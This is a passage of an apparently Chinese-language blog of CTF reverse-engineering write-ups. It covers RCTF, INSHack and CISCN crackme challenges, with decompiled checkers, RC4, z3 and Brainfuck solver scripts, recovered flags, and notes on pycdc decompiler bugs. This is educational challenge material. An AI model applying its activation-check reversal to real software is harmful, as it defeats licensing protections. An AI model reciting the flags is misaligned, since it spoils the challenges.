\u0026lt;\u0026lt;= 5 s += (s \u0026gt;\u0026gt; (len(bin(s)[2:]) - 5)) s \u0026amp;= ((1 \u0026lt;\u0026lt; (32 * 8)) - 1) from libnum import * i = 35 flag = [0 for _ in range(32)] for _ in range(32): i += -5 i %= 32 print (chr(n2s(s)[i]), end = \u0026#39;\u0026#39;) print () VM题真是体力活\n[RCTF2019]babyre1 这题其实出的挺好，就是flag的校验差一字节没写好，可惜了\n先要输入flag，并长度不能超过 0x10\n__printf_chk(1LL, \u0026#34;Input right flag you can got \u0026#39;Bingo!\u0026#39; :\u0026#34;); __isoc99_scanf(\u0026#34;%31s\u0026#34;, v11); v3 = \u0026amp;v11[strlen(v11)]; if ( (unsigned __int64)(v3 - v11) \u0026gt; 0x10 ) { puts(\u0026#34;input is too long!\u0026#34;); } 然后在else里进行的第一个函数中，将16位输入（按照十六进制）压缩成了8个字节，这里还没有要求大小写\n中间经过的加解密函数先略过，后面的验证是需要输出一个 Bingo!，要求CRC16的校验结果为0x69E2，然后就会对运算结果再异或 0x17 并输出，程序如下\nif ( v4 \u0026amp;\u0026amp; (v5 = sub_180(ptr, v4, \u0026amp;key_202010, 16, \u0026amp;a5), (v6 = v5) != 0LL) \u0026amp;\u0026amp; a5 \u0026gt; 0 \u0026amp;\u0026amp; CRC16_3D0(v5, a5) == 0x69E2 ) { for ( i = 0LL; a5 \u0026gt; (int)i; ++i ) v6[i] ^= 0x17u; puts(v6); if ( ptr ) free(ptr); free(v6); } 在知道运算结果后，看一下中间的运算，核心逻辑为\nxxtea_CE0((int *)v8, -(v10 \u0026gt;\u0026gt; 2), a3); v11 = v8[a2 - 1]; v8[a2] = 0; *a5 = a2; if ( a2 \u0026gt; v11 \u0026amp;\u0026amp; v11 \u0026lt;= 4 ) { v13 = a2 - v11; *a5 = v13; v8[v13] = 0; return (char *)v8; } 就是一个xxtea的程序（其中包括了加密和解密，特征很明显，就不展示了），然后是根据最后一个字节进行字符串的截断\n爆破了一下CRC，发现前六个字节正好满足，于是不知道咋办了，查了一下发现后来出题人提供了一个md5，那就写个解密程序然后爆破就行了\n[INSHack2017]proprietary-cctv-software 这题用uncompyle6能还原出来源码，是一个PyQt的代码，输入验证部分为\ndef btn_ok_clicked(self): s = \u0026#39;\u0026#39; for le in self.le_parts: s += le.text() s += \u0026#39;-\u0026#39; s = s[:-1] if self.activator.activate(s.upper()): self.c.ok.emit() else: self.c.ko.emit() self.close() 以及\nclass Activator(object): CHARSET = \u0026#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def __init__(self): super(Activator, self).__init__() self.z = 36 self.checksum = [30, 24, 18, 12, 6, 0] def block(self, b, mod): print_dbg(\u0026#39;call: block(self, b=\u0026lt;%s\u0026gt;, mod=%d)\u0026#39; % (b, mod)) if len(b) != 6: print_dbg(\u0026#39;err: incorrect block length (%d)\u0026#39; % len(b)) return s = 0 for k in range(0, len(b)): l = b[k] if l not in Activator.CHARSET: print_dbg(\u0026#39;err: input not found in charset (%s)\u0026#39; % l) return v = abs(Activator.CHARSET.index(l) - (k + 1)) s += v print_dbg(\u0026#39;current l is: %s\u0026#39; % l) print_dbg(\u0026#39;current k is: %d\u0026#39; % k) print_dbg(\u0026#39;current value is: %d\u0026#39; % v) print_dbg(\u0026#39;current sum is: %d\u0026#39; % s) return s % mod def activate(self, s): print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False for k in range(0, blocks_sz): self.z = self.block(blocks[k], self.z) print_dbg(\u0026#39;dbg: new z is: %d\u0026#39; % self.z) if self.z is None: print_dbg(\u0026#39;err: block function returned error\u0026#39;) return False if self.z != self.checksum[k]: print_dbg(\u0026#39;err: incorrect checksum (z=%dtested against checksum[%d]=%d)\u0026#39; % (self.z, k, self.checksum[k])) return False return True 一个方法是逆向这一部分，然后运行程序，应该就能拿到flag\n但懒得配环境了，所以又找了一下flag生成函数\nclass ActivatedWidget(QWidget): __doc__ = \u0026#39;docstring for ActivatedWidget\u0026#39; def __init__(self): super(ActivatedWidget, self).__init__() self.lab_result = None self.yek = [ 5, 202, 234, 95, 76, 173, 96, 10, 232, 7, 146, 79, 111, 147, 145, 13] self.vei = [ 175, 161, 61, 70, 144, 218, 0, 50, 73, 173, 240, 202, 184, 17, 148, 2] self.cne = [ 253, 14, 187, 117, 252, 19, 15, 86, 196, 138, 67, 165, 142, 237, 112, 47, 154, 189, 33, 75, 195, 205, 10, 56, 3, 230, 180, 147, 134, 27, 143, 15, 250, 19, 235, 96, 231, 5, 74, 83, 136, 149, 79, 170, 136, 252, 113, 112, 223, 248, 33, 119, 206, 218, 79, 121, 9, 225, 253, 156, 136, 26, 146, 93, 188, 94, 170, 79, 184, 87, 102, 61, 178, 167, 20, 231, 132, 253, 106, 38, 141, 224, 112, 98, 171, 153, 50, 89, 5, 194, 181, 247, 137, 23, 139, 31, 251, 89, 169, 89, 198, 127, 97, 10, 170, 246, 105, 197, 226, 128, 30, 22] self.init_ui() def finalize(self): clear = \u0026#39;\u0026#39; buf = self.cne key = self.yek iv = self.vei buf_sz = len(buf) bsize = 16 for i in range(0, int(buf_sz / bsize)): for j in range(0, bsize): c = buf[(i * bsize + j)] ^ key[j] ^ iv[j] iv[j] = buf[(i * bsize + j)] buf[i * bsize + j] = c i = buf[(buf_sz - 1)] for j in range(0, i): buf[buf_sz - 1 - j] = 0 for i in range(0, buf_sz): if buf[i] == 0: break clear += chr(buf[i]) return clear 手动将这一段提取出来，然后修改一下，将 return 改成 print ，也能拿到flag\n简要记录pycdc的bug ROT_TWO指令未成功还原 好像是蓝帽杯决赛的时候遇到的问题吧？当时用pycdas手动解的，后来修改了一下pyc文件前几个字节的混淆，用pycdc跑完后发现的问题（可能是混淆没去干净，只还原出了前三个函数，不过正好发现了这个bug）\n手动还原的为：\ndef gen_prime(n_bits): res = gen_num(n_bits) while not g.is_prime(res): b = 1 while b != 0: res, b = res ^ b, (res \u0026amp; b) \u0026lt;\u0026lt; 1 return res 然后用pycdc还原的为：\ndef gen_prime(n_bits): res = gen_num(n_bits) while not g.is_prime(res): b = 1 while b != 0: res = res ^ b b = (res \u0026amp; b) \u0026lt;\u0026lt; 1 return res 附上pycdas结果\n[Code] File Name: /somewhere/encrypt.py Object Name: gen_prime Arg Count: 1 KW Only Arg Count: 0 Locals: 3 Stack Size: 3 Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE) [Names] \u0026#39;gen_num\u0026#39; \u0026#39;g\u0026#39; \u0026#39;is_prime\u0026#39; [Var Names] \u0026#39;n_bits\u0026#39; \u0026#39;res\u0026#39; \u0026#39;b\u0026#39; [Free Vars] [Cell Vars] [Constants] None 1 0 [Disassembly] 0 LOAD_GLOBAL 0: gen_num 2 LOAD_FAST 0: n_bits 4 CALL_FUNCTION 1 6 STORE_FAST 1: res 8 SETUP_LOOP 54 (to 64) 10 LOAD_GLOBAL 1: g 12 LOAD_METHOD 2: is_prime 14 LOAD_FAST 1: res 16 CALL_METHOD 1 18 POP_JUMP_IF_TRUE 62 20 LOAD_CONST 1: 1 22 STORE_FAST 2: b 24 SETUP_LOOP 34 (to 60) 26 LOAD_FAST 2: b 28 LOAD_CONST 2: 0 30 COMPARE_OP 3 (!=) 32 POP_JUMP_IF_FALSE 58 34 LOAD_FAST 1: res 36 LOAD_FAST 2: b 38 BINARY_XOR 40 LOAD_FAST 1: res 42 LOAD_FAST 2: b 44 BINARY_AND 46 LOAD_CONST 1: 1 48 BINARY_LSHIFT 50 ROT_TWO 52 STORE_FAST 1: res 54 STORE_FAST 2: b 56 JUMP_ABSOLUTE 26 58 POP_BLOCK 60 JUMP_ABSOLUTE 10 62 POP_BLOCK 64 LOAD_FAST 1: res 66 RETURN_VALUE \u0026#39;gen_prime\u0026#39; 明显有个 ROT_TWO\n后来队友手写了一个demo测试了一下\n手写的为\na = a ^ b b = a | b 和\na, b = a ^ b, a | b 然后pycdc结果都是\na = a ^ b b = a | b pycdas结果则是一个有 ROT_TWO，一个没有，是正确的\nif判断后接for循环时出现无限嵌套 在做INSHACK2017那道题的时候，一开始电脑里没装uncompyle6，于是打算拿pycdc解，但运行了一下，发现直接生成了一个2G的文件，要不是SegmentFault了估计还能生成，用pycdas解了一下，感觉没什么问题\npycdc卡住的部分：\ndef activate(self, s): print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : # 后面就是无限嵌套了 uncompyle6结果\ndef activate(self, s): print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False for k in range(0, blocks_sz): self.z = self.block(blocks[k], self.z) print_dbg(\u0026#39;dbg: new z is: %d\u0026#39; % self.z) if self.z is None: print_dbg(\u0026#39;err: block function returned error\u0026#39;) return False if self.z != self.checksum[k]: print_dbg(\u0026#39;err: incorrect checksum (z=%dtested against checksum[%d]=%d)\u0026#39; % (self.z, k, self.checksum[k])) return False return True pycdas结果\n[Code] File Name: src/standalone/cctv_manager_standalone.py Object Name: activate Arg Count: 2 KW Only Arg Count: 0 Locals: 5 Stack Size: 7 Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE) [Names] \u0026#39;print_dbg\u0026#39; \u0026#39;split\u0026#39; \u0026#39;len\u0026#39; \u0026#39;range\u0026#39; \u0026#39;block\u0026#39; \u0026#39;z\u0026#39; \u0026#39;checksum\u0026#39; [Var Names] \u0026#39;self\u0026#39; \u0026#39;s\u0026#39; \u0026#39;blocks\u0026#39; \u0026#39;blocks_sz\u0026#39; \u0026#39;k\u0026#39; [Free Vars] [Cell Vars] [Constants] None \u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; \u0026#39;-\u0026#39; 6 \u0026#39;err: incorrect number of blocks (%d)\u0026#39; False 0 \u0026#39;dbg: new z is: %d\u0026#39; \u0026#39;err: block function returned error\u0026#39; \u0026#39;err: incorrect checksum (z=%dtested against checksum[%d]=%d)\u0026#39; True [Disassembly] 0 LOAD_GLOBAL 0: print_dbg 3 LOAD_CONST 1: \u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; 6 LOAD_FAST 1: s 9 BINARY_MODULO 10 CALL_FUNCTION 1 13 POP_TOP 14 LOAD_FAST 1: s 17 LOAD_ATTR 1: split 20 LOAD_CONST 2: \u0026#39;-\u0026#39; 23 CALL_FUNCTION 1 26 STORE_FAST 2: blocks 29 LOAD_GLOBAL 2: len 32 LOAD_FAST 2: blocks 35 CALL_FUNCTION 1 38 STORE_FAST 3: blocks_sz 41 LOAD_FAST 3: blocks_sz 44 LOAD_CONST 3: 6 47 COMPARE_OP 3 (!=) 50 POP_JUMP_IF_FALSE 71 53 LOAD_GLOBAL 0: print_dbg 56 LOAD_CONST 4: \u0026#39;err: incorrect number of blocks (%d)\u0026#39; 59 LOAD_FAST 3: blocks_sz 62 BINARY_MODULO 63 CALL_FUNCTION 1 66 POP_TOP 67 LOAD_CONST 5: False 70 RETURN_VALUE 71 SETUP_LOOP 156 (to 230) 74 LOAD_GLOBAL 3: range 77 LOAD_CONST 6: 0 80 LOAD_FAST 3: blocks_sz 83 CALL_FUNCTION 2 86 GET_ITER 87 FOR_ITER 139 (to 229) 90 STORE_FAST 4: k 93 LOAD_FAST 0: self 96 LOAD_ATTR 4: block 99 LOAD_FAST 2: blocks 102 LOAD_FAST 4: k 105 BINARY_SUBSCR 106 LOAD_FAST 0: self 109 LOAD_ATTR 5: z 112 CALL_FUNCTION 2 115 LOAD_FAST 0: self 118 STORE_ATTR 5: z 121 LOAD_GLOBAL 0: print_dbg 124 LOAD_CONST 7: \u0026#39;dbg: new z is: %d\u0026#39; 127 LOAD_FAST 0: self 130 LOAD_ATTR 5: z 133 BINARY_MODULO 134 CALL_FUNCTION 1 137 POP_TOP 138 LOAD_FAST 0: self 141 LOAD_ATTR 5: z 144 LOAD_CONST 0: None 147 COMPARE_OP 8 (is) 150 POP_JUMP_IF_FALSE 167 153 LOAD_GLOBAL 0: print_dbg 156 LOAD_CONST 8: \u0026#39;err: block function returned error\u0026#39; 159 CALL_FUNCTION 1 162 POP_TOP 163 LOAD_CONST 5: False 166 RETURN_VALUE 167 LOAD_FAST 0: self 170 LOAD_ATTR 5: z 173 LOAD_FAST 0: self 176 LOAD_ATTR 6: checksum 179 LOAD_FAST 4: k 182 BINARY_SUBSCR 183 COMPARE_OP 3 (!=) 186 POP_JUMP_IF_FALSE 87 189 LOAD_GLOBAL 0: print_dbg 192 LOAD_CONST 9: \u0026#39;err: incorrect checksum (z=%dtested against checksum[%d]=%d)\u0026#39; 195 LOAD_FAST 0: self 198 LOAD_ATTR 5: z 201 LOAD_FAST 4: k 204 LOAD_FAST 0: self 207 LOAD_ATTR 6: checksum 210 LOAD_FAST 4: k 213 BINARY_SUBSCR 214 BUILD_TUPLE 3 217 BINARY_MODULO 218 CALL_FUNCTION 1 221 POP_TOP 222 LOAD_CONST 5: False 225 RETURN_VALUE 226 JUMP_ABSOLUTE 87 229 POP_BLOCK 230 LOAD_CONST 10: True 233 RETURN_VALUE \u0026#39;Activator.activate\u0026#39; 也没看出来什么问题\n","date":"2021-05-26T23:54:09Z","image":"/post/reverse-from-1-to-2/cover_hu527ed7315192f7c3af2dd0a401d3a23d_899763_120x120_fill_q75_box_smart1.jpg","permalink":"/post/reverse-from-1-to-2/","title":"Reverse from 1 to 2"},{"content":"glass 安卓逆向，使用jeb打开，发现在java层仅进行了简单的输入，然后进入so层判断\n用ida打开so层，直接搜索java，进入判断函数\n下面的字符串应该是密钥\nqmemcpy(v6, \u0026#34;12345678\u0026#34;, sizeof(v6)); 然后调用了三个函数\nsub_FFC(v7, v6, v4); sub_1088(v7, flag, 39); sub_10D4(flag, 39, v6, v4); 进入查看，第一个是RC4密钥初始化，第二个是RC4加密，第三个是对密文进行简单的运算\n从字符串里拿密文，写脚本进行求解，先对简单运算进行反向运算，然后找个RC4密码的脚本，跑一下就可以找到flag\ncipher = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 5, 2, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F, 0] key = [0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38] def __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) result += k return result def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] from libnum import n2s, s2n for j in range(39): cipher[j] ^= key[j % 8] for j in range(0, 39, 3): cipher[j], cipher[j + 1], cipher[j + 2] = cipher[j + 1] ^ cipher[j + 2], cipher[j + 1] ^ cipher[j], cipher[j] ^ cipher[j + 1] ^ cipher[j + 2] print (rc4_crypt(key, cipher)) # b\u0026#39;CISCN{6654d84617f627c88846c172e0f4d46c}\\xec\u0026#39; baby_bc 不知道bc文件是什么，用 file 命令查看，发现是 LLVM ir bitcode 文件，上网搜索，使用 clang -o baby_bc baby.bc 搞成 elf 文件\n拖入ida进行查看\n首先对输入进行判断，分析输入的应该是长度是25的字符串，每个字符都在 0-5 之间\n要拿到flag需要通过两个验证函数\n第一个函数是将输入填入到map中，map中非零位输入应该为0，零位的输入不能为0\n第二个函数是对map进行验证，分析后发现总共进行了如下验证：\n 每行的数字不能相同 每列的数字不能相同 每行相邻两个数字的大小关系需要符合row矩阵的要求 每列相邻两个数字的大小关系需要符合col矩阵的要求  知道要求后直接上z3约束求解器拿flag\nfrom z3 import * s = Solver() flag = [Int(\u0026#34;flag_%i\u0026#34; % i) for i in range(25)] for i in range(25): s.add(flag[i] \u0026gt; 0) s.add(flag[i] \u0026lt; 6) s.add(flag[12] == 4) s.add(flag[18] == 3) for i in range(5): add_row = 0 add_col = 0 for j in range(5): add_row += flag[i * 5 + j] add_col += flag[j * 5 + i] s.add(add_row == 15) s.add(add_col == 15) s.add(flag[5] \u0026gt; flag[6]) s.add(flag[20] \u0026gt; flag[21]) s.add(flag[3] \u0026gt; flag[4]) s.add(flag[13] \u0026gt; flag[14]) s.add(flag[22] \u0026gt; flag[23]) s.add(flag[10] \u0026lt; flag[11]) s.add(flag[2] \u0026gt; flag[7]) s.add(flag[4] \u0026gt; flag[9]) s.add(flag[13] \u0026lt; flag[18]) s.add(flag[16] \u0026lt; flag[21]) s.add(flag[19] \u0026lt; flag[24]) for i in range(5): for j in range(5): for k in range(5): if j == k: continue s.add(flag[5 * i + j] != flag[5 * i + k]) s.add(flag[5 * j + i] != flag[5 * k + i]) if s.check() == sat: model = s.model() for i in range(25): print (model[flag[i]].as_long().real, end=\u0026#39;\u0026#39;) print (\u0026#39;\\nfinish\u0026#39;) # 1425353142354212153442315 最后把两个地方改成 0 就行了\nlittle_evil 基本分析 直接用ida直接打开会看到一个叫做\u0026quot;squashfs\u0026quot;，而且和ruby有关，但比赛的时候没有多想，然后就走远了\n\r\n放一张珍贵截图\n后来得知正确方法需要先用binwalk分解一下，这里有个坑，需要自己手动装一个\u0026quot;squashfs\u0026quot;的插件\n顺便补充一下什么是\u0026quot;squashfs\u0026quot;：基于Linux内核使用的压缩只读文件系统。难怪要用binwalk，沉思\n利用输出去混淆 分解后翻一下目录，可以找到一个 out.rb 的文件\n打开后发现是一个被严重混淆的脚本，大概长下面这样\n$l1Il=\u0026#34;\u0026#34;; $l1lI=\u0026#34;\u0026#34;; def llIl() $lI1lll=$lI1lll|7; end; def l1lll() $lI1lll=10; end; def llI1l() $lI1lll=$lI1lll|4; end; def lIlI() $lI1lll=$lI1lll+3; end; def l111() $lI1lll=$lI1lll%3; end; def lI1IlI() $lI1lll=$lI1lll|3; end; def ll1l1() $lI1lll=$lI1lll*8; end; def l1lI() $lI1lll=$lI1lll-3; end; def lI1lII() $lI1lll=$lI1lll%1; end; def lIlIl() $lI1lll=$lI1lll\u0026amp;10; end; def lIll() $lI1lll=$lI1lll-4; end; def lII1() $lI1lll=$lI1lll%2; end; def l1III() $lI1lll=$lI1lll|1; end; def l1l111() $lI1lll=$lI1lll|5; end; def l1IIII() $lI1lll=$lI1lll%10; end; def l11I() $l1Il=$l1Il+$lI1lll.chr; end; def lIlll() $lI1lll=$lI1lll*9; end; def l11IlI() $lI1lll=$lI1lll-8; end; def lI1I1() $lI1lll=$lI1lll+5; end; def ll11lI() $lI1lll=$lI1lll\u0026amp;9; end; def lII1l1() #send($l1Il[0,4], $l1Il[4,$l1Il.length]); aFile=File.new(\u0026#34;out2.rb\u0026#34;, \u0026#34;w\u0026#34;); aFile.syswrite($l1Il); aFile.close; end; 最后一个函数里本来只有一个 send 方法，这个方法是执行第一个参数的函数，后面的参数都是这个函数的变量\n这里跟着学长学习了一个针对解释性语言混淆的办法，就是直接输出这个send中的变量\n输出之后还是一个相似的脚本，简单换一下行，长这样：\n# eval $llll=\u0026#34;\u0026#34;; $llII=\u0026#34;\u0026#34;; def l1llI()$l1lI1l=$l1lI1l|7; end; def ll1III()$l1lI1l=$l1lI1l%7; end; def lllI()$l1lI1l=$l1lI1l/4; end; def lIl1l()$l1lI1l=$l1lI1l-3; end; def l1lll()$l1lI1l=$l1lI1l|10; end; def l11I1I()$l1lI1l=10; end; def l1l1()$l1lI1l=$l1lI1l\u0026amp;7; end; def l1II()$l1lI1l=$l1lI1l%8; end; def ll1I()$l1lI1l=$l1lI1l|8; end; def ll11()$l1lI1l=$l1lI1l^6; end; def ll1l1I()$l1lI1l=$l1lI1l|1; end; def lI1Il()$l1lI1l=$l1lI1l|3; end; def llI1I()$l1lI1l=$l1lI1l+6; end; def llIl1()$l1lI1l=$l1lI1l*4; end; def lI1ll()$l1lI1l=$l1lI1l*5; end; def l1111()$l1lI1l=$l1lI1l^7; end; def l1lII()$l1lI1l=$l1lI1l^4; end; def lIIl()$l1lI1l=$l1lI1l%5; end; def lII11()$l1lI1l=$l1lI1l+9; end; def lI11I()$llll=$llll+$l1lI1l.chr; end; def l1IlI()send($llll[0,4], $llll[4,$llll.length]); end; 一开始的 eval 就是 send 中调用的函数，可以分析出来后面的东西就是要用来执行的，因为这是解释性语言，直接输出就拿到源代码了\n和刚才进行同样的操作，拿到第三份脚本\nbegin $_=$$/$$;@_=$_+$_;$-_=$_-@_ $__=-\u0026gt;_{_==[]||_==\u0026#39;\u0026#39;?$.:$_+$__[_[$_..$-_]]} @__=-\u0026gt;_,\u0026amp;__{_==[]?[]:[__[_[$.]]]+@__[_[$_..$-_],\u0026amp;__]} $_____=-\u0026gt;_{@__[[*_],\u0026amp;-\u0026gt;__{__[$.]}]} @_____=-\u0026gt;_{@__[[*_],\u0026amp;-\u0026gt;__{__[$-_]}]} $______=-\u0026gt;_{___,______=$_____[_],@_____[_];_____=$__[___];____={};__=$.;(_=-\u0026gt;{ ____[______[__]]=___[__];(__+=$_)==_____ ?____:_[]})[]} @______=-\u0026gt;_,__{_=[*_]+[*__];____=$__[_];___={};__=$.;(_____=-\u0026gt;{ ___[_[__][$.]]=_[__][$_];(__+=$_)==____ ?___:_____[]})[]} $_______=-\u0026gt;_{$___=[];@___=$__[_];__=___=____=$.;$____,@____={},[] (_____=-\u0026gt;{ _[____]==\u0026#39;5\u0026#39;?(@____\u0026lt;\u0026lt;____):$. _[____]==\u0026#39;6\u0026#39;?($____[@____[$-_]]=____;@____=@____[$...$.-@_]):$. (____+=$_)==@___?$.:_____[]})[] $____=$____=={}?{}:@______[$____,$______[$____]] (______=-\u0026gt;{_[__]== \u0026#39;0\u0026#39;?($___[___]||=$.;$___[___]+=$_):_[__]== \u0026#39;1\u0026#39;?($___[___]||=$.;$___[___]-=$_):_[__]== \u0026#39;2\u0026#39;?($___[___]||=$.;$___[___]=STDIN.getc.ord):_[__]== \u0026#39;3\u0026#39;?(___+=$_):_[__]== \u0026#39;4\u0026#39;?(___-=$_):_[__]== \u0026#39;5\u0026#39;?(__=($___[___]||$.)==$.?$____[__]:__):_[__]== \u0026#39;6\u0026#39;?(__=($___[___]||$.)!=$.?$____[__]:__):_[__]== \u0026#39;7\u0026#39;?($\u0026gt;\u0026lt;\u0026lt;(\u0026#39;\u0026#39;\u0026lt;\u0026lt;$___[___])):$. (__+=$_)==@___?_:______[]})[]} $_______[\u0026#39;33516351...44516644\u0026#39;];rescue Exception;end #中间部分省略了 这份脚本就很丑了，最后一长串的数字，让我自己来猜的话肯定会猜是一个虚拟机\n然后一大堆 ? 一看就是 switch 语句，后来细看才发现全是三元运算符，但也是 switch 的作用\n于是将指令部分翻译成 python（只是熟悉一点而已）\nif _[tmp_2] == \u0026#39;0\u0026#39;: global_3[tmp_3] ||= $. global_3[tmp_3] += global_1 if _[tmp_2] == \u0026#39;1\u0026#39;: global_3[tmp_3] ||= $. global_3[tmp_3] -= global_1 if _[tmp_2] == \u0026#39;2\u0026#39;: global_3[tmp_3] ||= $. global_3[tmp_3] = STDIN.getc.ord if _[tmp_2] == \u0026#39;3\u0026#39;: tmp_3 += global_1 if _[tmp_2] == \u0026#39;4\u0026#39;: tmp_3 -= global_1 if _[tmp_2] == \u0026#39;5\u0026#39;: if (global_3[tmp_3] or $.) == $.: tmp_2 = global_4[tmp_2] if _[tmp_2] == \u0026#39;6\u0026#39;: if (global_3[tmp_3] or $.) != $.: tmp_2 = global_4[tmp_2] if _[tmp_2] == \u0026#39;7\u0026#39;: global_0\u0026lt;\u0026lt;(\u0026#39;\u0026#39;.append(global_3[tmp_3])) 因为是补题，所以提前知道是 brainfuck 语言，但还是尝试自己逆了一下\n tmp_3 是指针，操作3和4对应了指针+1 -1(\u0026gt;和\u0026lt;) global_3 是指针指向的字节，操作0和1对应了字节的+1 -1(+和-) 操作2中含有获取输入，对应了获取输入操作(,) 操作7中含有\u0026laquo;，怀疑是输出，对应了输出操作(.) 5和6对应了跳转，猜测5是[，6是]  之后就可以找个脚本翻译 brainfuck 了\n我先用 python 将其转为了正常的 brainfuck 语言\nfinalop = \u0026#39;\u0026#39; base = \u0026#39;+-,\u0026gt;\u0026lt;[].\u0026#39; for c in op: # 那一串数字 finalop += (base[int(c)]) print (finalop) 然后找了个脚本，这是核心部分：\nint cur = 0; while ((c = getc(in)) != EOF) { switch (c) { case \u0026#39;\u0026gt;\u0026#39;: // fprintf(out, \u0026#34;\\t\\t++c;\\n\u0026#34;);  cur++; break; case \u0026#39;\u0026lt;\u0026#39;: // fprintf(out, \u0026#34;\\t\\t--c;\\n\u0026#34;);  cur--; break; case \u0026#39;+\u0026#39;: fprintf(out, \u0026#34;\\t\\t++a[%d];\\n\u0026#34;, cur); break; case \u0026#39;-\u0026#39;: fprintf(out, \u0026#34;\\t\\t--a[%d];\\n\u0026#34;, cur); break; case \u0026#39;.\u0026#39;: fprintf(out, \u0026#34;\\t\\tputchar(a[%d]);\\n\u0026#34;, cur); break; case \u0026#39;,\u0026#39;: fprintf(out, \u0026#34;\\t\\ta[%d] = getchar();\\n\u0026#34;, cur); break; case \u0026#39;[\u0026#39;: fprintf(out, \u0026#34;\\twhile (a[%d]) {\\n\u0026#34;, cur); break; case \u0026#39;]\u0026#39;: fprintf(out, \u0026#34;\\t}\\n\u0026#34;); break; default: break; } } 一开始随便找了个脚本就运行，然后尝试去看，但后来发现很多指针位置的变化，看着很累，于是让指针的变化在内部运行，对具体数做变化的时候直接打印指针的值就可以了\nBrainfuck 代码阅读 接下来就是痛苦的 Brainfuck 代码阅读环节了，虽然代码已经有了最简单的美化，但看起来还是像混淆过的汇编。\n自己做的时候是一点一点美化代码，然后阅读的。但最后找到验证函数才搞明白。\n所以先去最下面找到验证函数，看到最下面有两个putchar，猜测就是通过验证了，于是找进入的条件\na[2] = getchar(); // several code \twhile (a[2]) { // several code \ta[1] = 0; // several code \t} a[2] = 0; a[3] = 0; while (a[1]) { ++a[2]; ++a[3]; --a[1]; } // several code \twhile (a[2]) { // several code \tputchar(a[4]); // several code \tputchar(a[4]); a[2] = 0; } 进入的条件是要 a[2] \u0026gt; 0，网上看就知道需要让 a[1] \u0026gt; 0，所以在编辑器里选中一下，就能找到所有 a[1] 出现的地方（这就体现出这种输出方法的优势了）\n然后发现 a[1] 会在一开始赋值为 1，但一旦进入 while(a[2]) 这种大循环，就会出现 a[1]=0 的赋值，所以我们的目标就是在进入循环前让 a[2]==0\n查看一下从 getchar 到 while 之间的代码，把重复出现的 ++ 都合并一下\n这里以第一次 getchar 的代码为例，（剩下几次形式几乎完全一致，就是参数有点小变化而已）\na[2] = getchar(); while (a[3]) { --a[3]; } while (a[4]) { --a[4]; } ++a[4]; ++a[4]; ++a[4]; ++a[4]; ++a[4]; ++a[4]; ++a[4]; while (a[4]) { ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; --a[4]; } while (a[3]) { --a[2]; --a[3]; } while (a[2]) { while (a[4]) { --a[4]; } while (a[5]) { --a[5]; } while (a[1]) { --a[1]; } while (a[4]) { ++a[5]; ++a[1]; --a[4]; } while (a[5]) { ++a[4]; --a[5]; } while (a[2]) { --a[2]; } } while (a[2]) { --a[2]; } 美化一下：\na[2] = getchar(); a[3] = 0; a[4] = 7; while (a[4]) { a[3] += 11 --a[4]; } // a[3] = a[4] * 11 = 77  a[2] -= a[3] while (a[2]) { a[4] = 0; a[5] = 0; a[1] = 0; a[2] = 0; } a[2] = 0; 简单地说就是会生成一个数字，然后用 a[2] 去减，如果结果为 0，就通过验证了，对所有的输入都搞一次，就能拿到五个输入字符 M5Ya7\n总结 